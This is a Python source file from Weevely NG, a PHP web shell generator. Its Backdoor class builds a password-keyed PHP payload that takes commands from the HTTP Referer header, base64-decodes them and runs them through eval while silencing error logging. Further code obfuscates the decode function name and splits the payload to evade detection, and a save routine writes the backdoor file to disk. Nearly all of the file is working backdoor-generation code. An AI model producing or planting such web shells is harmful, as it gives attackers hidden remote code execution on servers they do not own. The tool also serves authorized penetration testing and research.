# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
import base64
from random import random

class Backdoor:
	payload_template = """
ini_set('error_log', '/dev/null');
parse_str($_SERVER['HTTP_REFERER'],$a);
if(reset($a)=='%%%START_KEY%%%' && count($a)==9) {
echo '<%%%END_KEY%%%>';
eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
echo '</%%%END_KEY%%%>';
}
"""

	backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
	
	backdoor_template = """<?php 
	$%%FUNC_VAR%% = "%%B64_ENCODED%%";
	$%%FUNC_VAR%%1="%%PAYLOAD1%%";
	$%%FUNC_VAR%%2="%%PAYLOAD2%%";
	$%%FUNC_VAR%%3="%%PAYLOAD3%%";
	
	eval($%%FUNC_VAR%%(str_replace("%%FUNC_VAR%%",$%%FUNC_VAR%%1.$%%FUNC_VAR%%2.$%%FUNC_VAR%%3 , ""))); 
	?>
	"""

	def __init__( self, password ):
		self.password  = password
		self.start_key = self.password[:2]
		self.end_key   = self.password[2:]
		self.payload   = self.payload_template.replace( '%%%START_KEY%%%', self.start_key ).replace( '%%%END_KEY%%%', self.end_key ).replace( '\n', '' )
		self.backdoor  = self.backdoor_template.replace( '%%%PAYLOAD%%%', base64.b64encode(self.payload) )

#		print self.encode_template()
#		import sys
#		sys.exit()

	def __str__( self ):
		return self.backdoor

	def encode_template(self):
		
		b64_func_name = 'base64_decode'
		
		
		not_random_chars = ''
		for i in range(0, len(self.password)):
			not_random_chars = self.password[:i]
			if not not_random_chars in b64_func_name:
				break
			
		b64_func_name_encoded = ''
		for char in b64_func_name:
			if random() < 0.7:
				b64_func_name_encoded += not_random_chars + char
			else:
				b64_func_name_encoded += char
				
				
			
		encoded_payload = base64.b64encode(self.payload)	
		length  = len(encoded_payload)
		third	= length / 3
		thirds  = third * 2
		
		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_func_name_encoded )
		template = template.replace( '%%FUNC_VAR%%', not_random_chars )
		template = template.replace( '%%PAYLOAD1%%', encoded_payload[:third] )
		template = template.replace( '%%PAYLOAD2%%', encoded_payload[third:thirds] )
		template = template.replace( '%%PAYLOAD3%%', encoded_payload[thirds:] )
		
		print template
			
		
				 
		#php -r "\$i='base64_decode'; eval(\$i('cHJpbnQoJ2FzZCcpOw==')); print('aaaaaa' | 'b' );"

		

	def save( self, filename ):
		out = file( filename, 'wt' )
		out.write( self.backdoor )
		out.close()

		print "+ Backdoor file '%s' created with password '%s'." % ( filename, self.password )
